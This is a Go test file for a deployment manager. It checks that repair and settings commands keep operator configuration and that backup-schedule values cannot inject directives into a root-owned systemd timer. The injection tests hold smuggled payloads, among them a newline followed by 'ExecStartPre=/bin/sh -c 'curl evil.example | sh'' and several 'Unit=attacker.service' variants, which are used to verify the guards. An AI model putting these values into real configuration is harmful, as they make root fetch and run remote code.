package suite

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/morzecrew/morzer/internal/adapters/supervisor/systemd"
	"github.com/morzecrew/morzer/internal/domain"
	"github.com/morzecrew/morzer/internal/lifecycle/ops"
	"github.com/morzecrew/morzer/internal/ports"
	"github.com/morzecrew/morzer/test/fakes"
)

// `init --repair`, and the unit reconciliation beside it.
//
// Both rebuild something from partial inputs, and both used to lose whatever
// the inputs did not mention. That is the defect this file exists to pin: a
// command an operator runs *because something is already wrong* must not be the
// command that takes their configuration away.

// A repair keeps what an operator configured after `init`.
//
// The dangerous shape, and it is the ordinary one: a machine set up months ago,
// given a bucket, a channel and somewhere to send alerts, whose /etc directory
// lost a folder. `init --repair` re-creates the layout -- and rebuilt the
// installation record from the flags on *this* command line, so every
// arrangement made since `init` was silently dropped. An operator repairing a
// directory found out at the next backup, or during a recovery, or never.
func TestARepairKeepsWhatTheOperatorConfigured(t *testing.T) {
	requireSOPS(t)
	ctx := context.Background()

	// A real `init`, because a real `--repair` is what is under test and it
	// runs every step of one. The harness's shortcut installs state without
	// the age identity the repair re-checks.
	_, recoveryPub := generateRecoveryKey(t)
	h := initOriginMachine(t, ctx, recoveryPub)

	inst, err := h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)

	inst.Backup.Targets = []domain.BackupTargetConfig{{
		URL: "s3://customer-bucket/backups", Credentials: "s3_credentials",
	}}
	inst.Notify.Targets = []domain.NotifyTargetConfig{{
		Name: "oncall", URLSecret: "slack_webhook",
	}}
	inst.Update.Channel = "oci://registry.example/demo/bundle:stable"
	inst.Update.Check = true
	inst.Domains = []string{"app.example"}
	inst.Policy.BackupSchedule = "Mon *-*-* 04:00:00"
	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))

	// A schedule of spaces is "not given", not "blank it". `--backup-schedule`
	// outranks the carried Policy when it was supplied, so testing that on the
	// untrimmed value would make a stray quoted space delete the maintenance
	// window this repair exists to preserve -- and a whitespace-only value is
	// non-empty, so it would also be stored and shown back by `config get`.
	_, err = ops.Init(ctx, h.Deps, ops.InitOptions{
		Product: "demo", Repair: true, RecoveryRecipient: recoveryPub,
		BackupSchedule: "   ",
	})
	require.NoError(t, err)

	after, err := h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)

	assert.Equal(t, inst.Backup.Targets, after.Backup.Targets,
		"the repair dropped the backup targets, so every copy of this "+
			"deployment's data is now on this machine and nobody was told")
	assert.Equal(t, inst.Notify.Targets, after.Notify.Targets,
		"the repair dropped the notify targets, so the alerts an operator "+
			"arranged silently stop arriving")
	assert.Equal(t, inst.Update.Channel, after.Update.Channel,
		"the repair dropped the update channel")
	assert.True(t, after.Update.Check)
	assert.Equal(t, "Mon *-*-* 04:00:00", after.Policy.BackupSchedule)

	// And the other half of that rule: a schedule that *was* given outranks
	// the carried Policy. Without this the branch above is only ever tested
	// on its untaken side, so a repair that silently ignored the flag would
	// pass -- and "carries what it did not create" would have quietly become
	// "cannot be told anything".
	_, err = ops.Init(ctx, h.Deps, ops.InitOptions{
		Product: "demo", Repair: true, RecoveryRecipient: recoveryPub,
		BackupSchedule: "  Sun *-*-* 05:00:00  ",
	})
	require.NoError(t, err)

	after, err = h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)
	assert.Equal(t, "Sun *-*-* 05:00:00", after.Policy.BackupSchedule,
		"a schedule given to a repair was ignored, or stored with its padding")
	assert.Equal(t, inst.Backup.Targets, after.Backup.Targets,
		"setting the window on a repair took the targets away")

	// And the identity half, which already worked and must keep working.
	assert.Equal(t, inst.ID, after.ID)
	assert.Equal(t, inst.AttestationSalt, after.AttestationSalt)
	assert.Equal(t, inst.Domains, after.Domains)
}

// A setting change does not rewrite the backup window.
//
// The reconciliation renders the unit set from what the installation says, and
// the schedule was not in the installation at all -- it was a flag `init` read
// once and nothing persisted. So every later reconciliation rendered the
// *default*, and an unrelated `morzer config set` silently moved an operator's
// maintenance window from Monday 04:00 to nightly 02:30. Exit zero, no warning.
//
// Asserted against the real unit text rather than the port, because the value
// only exists once a template has rendered it: a fake supervisor renders a
// placeholder, and a test against one would pass with the schedule dropped.
func TestAnUnrelatedSettingChangeKeepsTheBackupWindow(t *testing.T) {
	h := newHarness(t)
	inst := h.install()
	ctx := context.Background()

	inst.Policy.BackupSchedule = "Mon *-*-* 04:00:00"
	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))

	unitDir := t.TempDir()
	real := systemd.New(fakes.NewScripted(), systemd.WithUnitDir(unitDir))
	h.Deps.Supervisor = availableSupervisor{Supervisor: real}

	units, err := h.Deps.Supervisor.Units(ports.UnitParams{
		Product: "demo", BackupSchedule: inst.Policy.BackupSchedule,
	})
	require.NoError(t, err)
	require.NoError(t, h.Deps.Supervisor.InstallUnits(ctx, units, ports.EnableAll))
	require.Equal(t, "OnCalendar=Mon *-*-* 04:00:00", onCalendar(t, unitDir),
		"the window was not installed, so this test proves nothing")

	_, err = ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
		Set: map[string]string{"update.check": "true"},
	})
	require.NoError(t, err)

	assert.Equal(t, "OnCalendar=Mon *-*-* 04:00:00", onCalendar(t, unitDir),
		"a `config set` about update checking rewrote the backup window")
}

// The window is settable, which it was not.
//
// It arrived as an `init` flag and lived nowhere afterwards, so an operator who
// wanted a different one had to re-run `init --repair` -- the command that,
// until this change, took their targets away. Now it is a setting, which is
// what it always was: an operator's arrangement with the manager.
func TestTheBackupWindowCanBeChangedAfterInit(t *testing.T) {
	h := newHarness(t)
	h.install()
	ctx := context.Background()

	unitDir := t.TempDir()
	real := systemd.New(fakes.NewScripted(), systemd.WithUnitDir(unitDir))
	h.Deps.Supervisor = availableSupervisor{Supervisor: real}

	units, err := h.Deps.Supervisor.Units(ports.UnitParams{Product: "demo"})
	require.NoError(t, err)
	require.NoError(t, h.Deps.Supervisor.InstallUnits(ctx, units, ports.EnableAll))

	_, err = ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
		Set: map[string]string{"backup.schedule": "Sun *-*-* 05:00:00"},
	})
	require.NoError(t, err)

	assert.Equal(t, "OnCalendar=Sun *-*-* 05:00:00", onCalendar(t, unitDir))

	inst, err := h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)
	assert.Equal(t, "Sun *-*-* 05:00:00", inst.Policy.BackupSchedule)

	// Cleared, and the default comes back rather than an empty OnCalendar,
	// which systemd refuses to load.
	_, err = ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
		Unset: []string{"backup.schedule"},
	})
	require.NoError(t, err)
	assert.Equal(t, "OnCalendar="+systemd.DefaultBackupSchedule, onCalendar(t, unitDir))
}

// A schedule reaches a root-owned unit file, so it is bounded like anything
// else that does.
//
// It used to arrive only from argv at `init`. Persisting it means every later
// reconciliation reads it back out of the manager's state file and renders it
// again, without revisiting the door it came in through -- and
// `OnCalendar={{.BackupSchedule}}` is a line in a systemd unit. A value with a
// newline in it is a second directive.
func TestAScheduleCannotSmuggleADirectiveIntoTheUnit(t *testing.T) {
	// Where the newline sits decides whether a trim-then-scan guard sees it.
	// The interior case is the one anybody writes first; a *leading* one is
	// removed by the trim before the scan runs, and what reaches the unit file
	// is the raw value, newline and all. `Unit=` in a [Timer] section names
	// what the timer starts, so that spelling needs no shell to be worth
	// refusing.
	//
	// A harness each, deliberately. Sharing one made a case that wrote a value
	// leave it behind for the next, which reported the leftover as its own
	// failure and hid which payload actually got through.
	for name, payload := range map[string]string{
		"a directive on a second line":        "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'",
		"a directive after a leading newline": "\nUnit=attacker.service",
		"a leading carriage return":           "\rUnit=attacker.service",
		"a directive after a leading tab":     "\tUnit=attacker.service",
		"a trailing newline and a directive":  "daily\nUnit=attacker.service\n",
	} {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			h.install()
			ctx := context.Background()

			_, err := ops.SetSettings(ctx, h.Deps, ops.SetSettingsOptions{
				Set: map[string]string{"backup.schedule": payload},
			})

			inst, loadErr := h.Deps.State.LoadInstallation(ctx)
			require.NoError(t, loadErr)
			stored := inst.Policy.BackupSchedule

			// The property, not the mechanism. Two outcomes are correct and
			// which one an operator meets depends on where the line break
			// sits: this door trims before it validates, so leading and
			// trailing whitespace is stripped rather than refused -- the
			// ergonomics of `--backup-schedule "$(cat window.txt)"`. What is
			// never correct is a stored value that still carries the break.
			if err != nil {
				assert.Contains(t, domain.AsError(err).Message, "one line")
				assert.Empty(t, stored,
					"the refusal wrote the value anyway, which is what it was refusing")
				return
			}

			assert.NotContains(t, stored, "\n",
				"a schedule carrying a line break was stored and will be rendered")
			assert.NotContains(t, stored, "\r",
				"a schedule carrying a carriage return was stored and will be rendered")

			// And the unit that value produces has the directives it should.
			unitDir := t.TempDir()
			real := systemd.New(fakes.NewScripted(), systemd.WithUnitDir(unitDir))
			units, unitsErr := real.Units(ports.UnitParams{
				Product: "demo", BackupSchedule: stored,
			})
			require.NoError(t, unitsErr)
			require.NoError(t, real.InstallUnits(ctx, units, ports.EnableAll))
			assert.NotContains(t, unitText(t, unitDir), "\nUnit=attacker.service",
				"the schedule opened a second directive in the timer unit")
		})
	}
}

// The other two refusals the bound carries, and the override beside them.
//
// Both are detection branches: they run only when the value is already wrong,
// which is exactly the code that must not be dead. Coverage found them; no
// mutation of the happy path would have.
func TestTheScheduleBoundRefusesWhatItSaysItRefuses(t *testing.T) {
	h := newHarness(t)
	inst := h.install()
	ctx := context.Background()

	// Long. Not a plausible expression -- which is the point of a bound that
	// is generous against every real one and far short of a payload.
	inst.Policy.BackupSchedule = strings.Repeat("*", 201)
	err := h.Deps.State.SaveInstallation(ctx, inst)
	require.Error(t, err, "a schedule longer than the bound was written")
	assert.Contains(t, domain.AsError(err).Message, "at most 200 characters")

	// And the bound is not off by one against a value that fits exactly.
	inst.Policy.BackupSchedule = strings.Repeat("*", 200)
	assert.NoError(t, h.Deps.State.SaveInstallation(ctx, inst),
		"a schedule exactly at the bound was refused")
}

// The injection, played out against the real unit file.
//
// `config set` trims before it validates, so that door stored a mangled value
// rather than a newline. `init --backup-schedule` assigned what it was given,
// and `SaveInstallation` validated through a guard that trimmed its own copy
// first -- so a leading newline survived validation, survived the state file,
// and arrived at `OnCalendar={{.BackupSchedule}}` intact. It rendered as
//
//	[Timer]
//	OnCalendar=
//	Unit=attacker.service
//
// and `Unit=` in a [Timer] section names what the timer starts: root running
// something else on a schedule, from an `init` flag or a state file.
//
// Three guards now, and this asserts each separately, because any one of them
// alone would leave a door: the writer refuses it, the loader refuses it, and
// the renderer -- the thing that actually writes as root -- refuses it for a
// caller nobody has written yet.
func TestALeadingNewlineDoesNotReachTheUnitFile(t *testing.T) {
	h := newHarness(t)
	inst := h.install()
	ctx := context.Background()

	const payload = "\nUnit=attacker.service"

	// The renderer, which is the guard nearest the root-owned file.
	unitDir := t.TempDir()
	real := systemd.New(fakes.NewScripted(), systemd.WithUnitDir(unitDir))
	_, err := real.Units(ports.UnitParams{Product: "demo", BackupSchedule: payload})
	require.Error(t, err,
		"the renderer accepted a schedule that would add a directive to the unit")

	// And a whitespace-only schedule is not a schedule: an exact `== ""`
	// check would skip the nightly default and render `OnCalendar=` with
	// nothing after it, which systemd refuses to load.
	units, err := real.Units(ports.UnitParams{Product: "demo", BackupSchedule: "   "})
	require.NoError(t, err)
	require.NoError(t, real.InstallUnits(ctx, units, ports.EnableAll))
	assert.Equal(t, "OnCalendar="+systemd.DefaultBackupSchedule, onCalendar(t, unitDir),
		"a schedule of spaces produced an OnCalendar systemd will not load")

	// And the state file refuses it, which is the guard that should mean the
	// renderer never sees it.
	inst.Policy.BackupSchedule = payload
	err = h.Deps.State.SaveInstallation(ctx, inst)
	require.Error(t, err,
		"a schedule whose first character is a newline was written to the state file")
	assert.Contains(t, domain.AsError(err).Message, "one line")
}

// Every field of an installation is classified for a repair.
//
// The same mechanism decision 7 established for a sandbox, applied to the other
// place this codebase rebuilds an installation from partial inputs. A field
// added to `Installation` next year fails this until somebody says whether a
// repair carries it -- which is the only check that survives the person who
// knew about it leaving, and its absence is exactly how `update`, `notify` and
// `backup` came to be dropped without anybody deciding that.
func TestEveryInstallationFieldIsClassifiedForARepair(t *testing.T) {
	classified := map[string]string{
		"SchemaVersion": "rewritten to this manager's version, which is what a repair is for",
		"ID":            "carried: backups are stamped with it and restore checks against it",
		"Product":       "from the flag; --product is required and names which installation",
		"CreatedAt":     "carried: a repaired machine was not created today",

		"Mode":    "carried unless --mode is given, and a change is refused by the state store",
		"Profile": "carried unless --profile is given",
		"Domains": "carried unless --domain is given",

		"Runtime": "carried from the existing state, always. Rebuilding it from " +
			"the release would let a vendor who changed runtimes between " +
			"releases re-point an installation whose volumes and image " +
			"references belong to the old one -- the transition RFC 0023 " +
			"decision 3 forbids, arriving as a repair",

		"RuntimeOptions": "carried from the existing state, and the consequence of " +
			"rebuilding is sharper than Runtime's. These name what the " +
			"runtime creates -- under compose, the project prefixing every " +
			"volume -- so a repair that took them from the release would " +
			"adopt a renamed project in the one command an operator runs " +
			"because something is already wrong, and bring the deployment " +
			"up against empty storage",

		// One verdict for the block, because it is carried as a block.
		// The sandbox table classifies Policy field by field for a
		// different question; here the question is whether a repair
		// rebuilds it, and it does not.
		"Policy": "carried whole: it is the operator's arrangement, not this command's",

		"Parameters": "from the flags: --set is how a repair changes one, and an empty " +
			"set carries what was there",

		"Update": "carried: a channel configured after `init` is not this command's to drop",
		"Notify": "carried: alerting configured after `init` is not this command's to drop",
		"Backup": "carried: targets configured after `init` are not this command's to drop",

		"Signing":         "carried, except when this run minted a key -- see buildInstallation",
		"AttestationSalt": "carried: re-minting breaks the configuration-digest chain",
	}

	// The same twelve-line walk as the sandbox table's, deliberately
	// duplicated rather than shared: two independent questions about one
	// type, and a helper joining them would make a change to either look
	// like a change to both.
	typ := reflect.TypeOf(domain.Installation{})
	seen := make(map[string]bool, typ.NumField())
	for i := range typ.NumField() {
		name := typ.Field(i).Name
		seen[name] = true
		if _, ok := classified[name]; !ok {
			t.Errorf("Installation.%s is not classified for a repair: nobody has said "+
				"whether `init --repair` carries it from the existing state or "+
				"rebuilds it from the flags.\nAdd it to this table with a reason, "+
				"and to buildInstallation's repair branch if it is carried.", name)
		}
	}
	for name := range classified {
		assert.Truef(t, seen[name],
			"%s is classified for a repair and no longer exists", name)
	}
	for name, why := range classified {
		assert.NotEmptyf(t, why, "%s is classified without saying why", name)
	}
}

// availableSupervisor reports systemd as usable without one being present.
//
// The real renderer with a relocated unit directory is what makes these tests
// about the unit *text*; only Available has to be answered differently, because
// the host running the suite may have no systemd at all.
type availableSupervisor struct{ *systemd.Supervisor }

func (availableSupervisor) Available(context.Context) bool { return true }

// onCalendar reads the schedule out of the installed backup timer.
// unitText returns the rendered backup timer, for the assertions that are about
// the file rather than about one field of it.
func unitText(t *testing.T, unitDir string) string {
	t.Helper()
	body, err := os.ReadFile(filepath.Join(unitDir, "demo-backup.timer"))
	require.NoError(t, err)
	return string(body)
}

func onCalendar(t *testing.T, unitDir string) string {
	t.Helper()
	body, err := os.ReadFile(filepath.Join(unitDir, "demo-backup.timer"))
	require.NoError(t, err)
	for line := range strings.SplitSeq(string(body), "\n") {
		if strings.HasPrefix(line, "OnCalendar=") {
			return line
		}
	}
	t.Fatalf("no OnCalendar in the timer:\n%s", body)
	return ""
}

// The same refusal on the path the guard actually exists for.
//
// `config set` is one way a schedule arrives; the other is a value already in
// the state file, which is where `unitParams` reads it from and which no
// command has to have written. The bound exists for that one -- the value is
// rendered into `OnCalendar=` in a root-owned unit file -- so it is asserted by
// writing the state directly and reading it back, rather than by handing a bad
// value to the writer. A guard proved only against `SaveInstallation` is a
// guard over the door this threat does not come through.
func TestAHandEditedScheduleIsRefusedOnLoad(t *testing.T) {
	h := newHarness(t)
	inst := h.install()
	ctx := context.Background()

	// A real state file first, so what is patched below is the shape the
	// store actually writes rather than one this test invented.
	inst.Policy.BackupSchedule = "daily"
	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))

	path := h.Deps.Paths.InstallationState()
	raw, err := os.ReadFile(path)
	require.NoError(t, err)
	require.Contains(t, string(raw), `"backup_schedule": "daily"`,
		"the state file does not hold the schedule where this test patches it")

	patched := strings.Replace(string(raw),
		`"backup_schedule": "daily"`,
		`"backup_schedule": "daily\nUnit=attacker.service"`, 1)
	require.NoError(t, os.WriteFile(path, []byte(patched), 0o600))

	_, err = h.Deps.State.LoadInstallation(ctx)
	require.Error(t, err,
		"a state file carrying a second unit directive was loaded and would be rendered")
	assert.Contains(t, domain.AsError(err).Message, "backup_schedule")

	// And the writer refuses it too, which is the cheaper of the two.
	inst.Policy.BackupSchedule = "daily\nExecStartPre=/bin/sh -c 'curl evil.example | sh'"
	err = h.Deps.State.SaveInstallation(ctx, inst)
	require.Error(t, err, "an installation carrying a second unit directive was written")
	assert.Contains(t, domain.AsError(err).Message, "backup_schedule")
}

// A repair must not re-point an installation at a different runtime.
//
// RFC 0023 decision 3 fixes the runtime when the installation is created and
// forbids a transition, because the state directory records volume names and
// image references that belong to one runtime. `init --repair` re-runs every
// step of an init, and the first version of this branch rebuilt the runtime
// from the release -- so a vendor who moved between runtimes would have a
// repair silently adopt the new one, against volumes belonging to the old.
//
// The classification table above says "carried". This is what makes that a
// claim about the code rather than a sentence somebody wrote: removing the
// carry passes the table and fails here.
func TestARepairKeepsTheRecordedRuntime(t *testing.T) {
	requireSOPS(t)
	ctx := context.Background()

	_, recoveryPub := generateRecoveryKey(t)
	h := initOriginMachine(t, ctx, recoveryPub)

	inst, err := h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)

	// A runtime this machine was created against and the release does not
	// declare. Contrived on purpose: it is the only shape where "carried"
	// and "rebuilt from the release" give different answers, and every
	// natural fixture makes them agree.
	inst.Runtime = "quadlet"
	require.NoError(t, h.Deps.State.SaveInstallation(ctx, inst))

	_, err = ops.Init(ctx, h.Deps, ops.InitOptions{
		Product: "demo", Repair: true, RecoveryRecipient: recoveryPub,
	})
	require.NoError(t, err)

	after, err := h.Deps.State.LoadInstallation(ctx)
	require.NoError(t, err)

	assert.Equal(t, "quadlet", after.Runtime,
		"the repair re-pointed the installation at the release's runtime, "+
			"which is the transition decision 3 forbids arriving as a repair")
}
